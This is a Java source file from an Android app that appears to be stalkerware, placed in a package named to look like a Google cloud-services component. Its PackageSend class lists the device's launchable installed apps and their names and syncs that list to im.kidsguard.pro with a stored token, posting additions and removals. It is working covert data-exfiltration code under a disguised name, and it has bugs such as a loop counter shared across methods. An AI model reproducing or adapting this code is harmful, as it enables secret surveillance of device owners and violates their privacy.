package com.google.cloudservices;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import com.android.volley.Cache;
import com.android.volley.Network;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.BasicNetwork;
import com.android.volley.toolbox.DiskBasedCache;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PackageSend {
    JSONObject pkgjson;
    JSONArray pkgarray,pkgarraydel;
    ArrayList<String> pkg1=new ArrayList<String>();
    ArrayList<String> name1=new ArrayList<String>();
    ArrayList<String> pkgInsert=new ArrayList<String>();
    ArrayList<String> nameInsert=new ArrayList<String>();
    ArrayList<String> pkgDelet=new ArrayList<String>();
    ArrayList<String> nameDelet=new ArrayList<String>();
    Map<String,String> params=null;
    StringRequest stringRequest=null;
    RequestQueue requestQueue=null;
    int i=0,activity;
    int c=0;
    String num=null;
    ApplicationInfo data=null;
    public void inspkgname(Context context,ArrayList<String> serverPackage){
        pkgarray=new JSONArray();
        pkgarraydel=new JSONArray();
        dbFirsRun dbFirsRun=new dbFirsRun(context);
        if (dbFirsRun.getrun().get(3).equals("packfirst")){
            activity=1;
            dbFirsRun.Updatecall("packsec","4");
        }else{activity=2;}
        PackageManager packageManager = context.getPackageManager();
        List<ApplicationInfo> list = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        List<ApplicationInfo> applist = new ArrayList<ApplicationInfo>();
        for (ApplicationInfo info : list) {
            try {
                if (null != packageManager.getLaunchIntentForPackage(info.packageName)) {
                    applist.add(info);
                }
            } catch (Exception e) {
                SendEror sendEror=new SendEror();
                sendEror.sender(context,e.toString());
                e.printStackTrace();
            }
        }


        while (c<applist.size()){
             data = applist.get(c);
            pkg1.add(data.packageName);
            num=data.loadLabel(context.getPackageManager()).toString();
            name1.add(num);
           if (serverPackage.size()>0){
                if (serverPackage.contains(data.packageName)){}else
                { pkgInsert.add(data.packageName);
                    nameInsert.add(num);
                }

            }else {pkgInsert.add(data.packageName);
                nameInsert.add(num);}/**/


c++;
        }

        int b=0;
        while (b<serverPackage.size()){
            if (pkg1.contains(serverPackage.get(b))){}else {
                if (pkgDelet.contains(serverPackage.get(b))){}else {
                pkgDelet.add(serverPackage.get(b)); }
            }
            b++;
        }
        insertpkg(context,pkgInsert,nameInsert);
        Deletpkg(context,pkgDelet);
        serverPackage.clear();
        applist.clear();
    }
    public void packagereq(Context context){
        try {
            Cache cache = new DiskBasedCache(context.getCacheDir(), 1024 * 1024);
            Network network = new BasicNetwork(new HurlStack());
            requestQueue = new RequestQueue(cache, network);
            requestQueue.start();
            cache.clear();
            stringRequest=new StringRequest(Request.Method.POST,"https://im.kidsguard.pro/api/packagename-list/",
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {

                            requestQueue.stop();
                            try {
                                JSONObject alljs=new JSONObject(response);
                                String status=alljs.getString("status");

                                switch (status){
                                    case "ok":
                                        JSONArray pknamearay=alljs.getJSONArray("packagename");
                                        ArrayList<String> res=new ArrayList<String>();
                                        int i=0;
                                        while (i<pknamearay.length()){
                                           // JSONObject pjs=pknamearay.getJSONObject(i);
                                            String s=pknamearay.getString(i);
                                            res.add(s);
                                            i++;
                                        }
                                        inspkgname(context,res);
                                        break;
                                    default:
                                        break;
                                }


                            } catch (JSONException e) {
                                e.printStackTrace();
                                SendEror sendEror=new SendEror();
                                sendEror.sender(context,e.toString());
                            }
                        }
                    }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                   // SendEror sendEror=new SendEror();
                   // sendEror.sender(context,error.toString());
                }

            })
            {
                @Override
                protected Map<String, String> getParams(){
                    params=new HashMap<String, String>();
                    params.put("token",getToken(context));
                    return params;
                }
            };

            requestQueue.add(stringRequest);
        }catch (Exception e){}finally {
           requestQueue.cancelAll(stringRequest);
           //params.clear();

        }

    }
    public void insertpkg(Context context,ArrayList<String> pkgInsert,ArrayList<String> NameInsert){
        if (pkgInsert.size()>0){
        while (i<pkgInsert.size()) {

            try {
                pkgjson=new JSONObject();
                pkgjson.put("packagename", pkgInsert.get(i));
                pkgjson.put("name", NameInsert.get(i));
                pkgarray.put( i,pkgjson);



            } catch (JSONException e) {
                e.printStackTrace();
                SendEror sendEror=new SendEror();
                sendEror.sender(context,e.toString());
            }
            i++;
        }
        try {
            if (pkgarray.getString(0).equals(null)){}else {
                String p= String.valueOf(pkgarray);
                sm sm=new sm();

                sm.add(context,"https://im.kidsguard.pro/api/add-packagename/","pack",p);
            }
        } catch (JSONException e) {
            e.printStackTrace();
            SendEror sendEror=new SendEror();
            sendEror.sender(context,e.toString());
        }}
    }
    public void Deletpkg(Context context,ArrayList<String> pkgdel){
        if (pkgdel.size()>0){
        while (i<pkgdel.size()) {

            try {
                pkgjson=new JSONObject();
                pkgjson.put("packagename", pkgdel.get(i));
                pkgarraydel.put( i,pkgjson);



            } catch (JSONException e) {
                e.printStackTrace();
                SendEror sendEror=new SendEror();
                sendEror.sender(context,e.toString());
            }
            i++;
        }
        try {
            if (pkgarraydel.getString(0).equals(null)){}else {


                String p= pkgarraydel.toString();
                sm sm=new sm();

                sm.add(context,"https://im.kidsguard.pro/api/delete-packagename/","packages",p);

            }
        } catch (JSONException e) {
            e.printStackTrace();
            SendEror sendEror=new SendEror();
            sendEror.sender(context,e.toString());
        }
    }
    }
    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
}
